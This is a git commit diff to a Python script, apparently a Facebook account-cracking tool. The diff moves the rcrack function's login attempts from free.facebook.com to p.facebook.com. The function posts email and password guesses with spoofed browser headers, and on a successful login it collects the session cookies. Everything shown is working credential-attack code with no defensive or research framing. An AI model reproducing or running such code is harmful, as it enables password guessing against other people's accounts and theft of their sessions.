809b62ce010f0f71a3976c0db0bdc56b0d93a0f7
mrrakibkhan420 <134503086+mrrakibkhan420@users.noreply.github.com>
2023-06-27 18:10:22 +0600

    Update Xz.py

--- Xz.py
+++ Xz.py
@@ -306,7 +306,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
+            header_freefb = {"authority": 'p.facebook.com',
             "method": 'POST',
             "scheme": 'https',
             "accept": 'application/x-www-form-urlencoded',
@@ -326,7 +326,7 @@ def rcrack(uid,pwx,tl):
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
